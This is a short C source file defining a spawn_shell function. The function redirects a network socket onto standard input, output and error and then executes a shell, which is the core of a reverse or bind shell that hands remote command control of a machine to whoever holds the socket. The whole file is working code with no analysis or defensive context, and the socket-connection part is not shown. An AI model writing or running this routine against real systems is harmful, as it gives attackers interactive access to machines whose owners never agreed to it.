#include <stdio.h>          // perror (optional)
#include <unistd.h>         // dup2, execve, close
#include <errno.h>     
#include "shell.h"



int spawn_shell(int network_socket, const char *shell_path){
    if (network_socket < 0 || !shell_path || !*shell_path) {
        errno = EINVAL;
        return -1;   
    }

    // duplicate the file descriptor for stdin, stdout, and stderr
        if (dup2(network_socket, STDIN_FILENO) == -1 || dup2(network_socket, STDOUT_FILENO) == -1 || dup2(network_socket, STDERR_FILENO) == -1){
            perror("dup2 failed");
            close(network_socket);
            return -1;
        }
        // close the original socket file descriptor
        close(network_socket);

        // execute a shell
        char *shell[] = {(char*)shell_path, NULL};
        execve(shell_path, shell, NULL);
        
        // if execve returns, it means there was an error
        perror("execve failed");
        return -1;

}    

        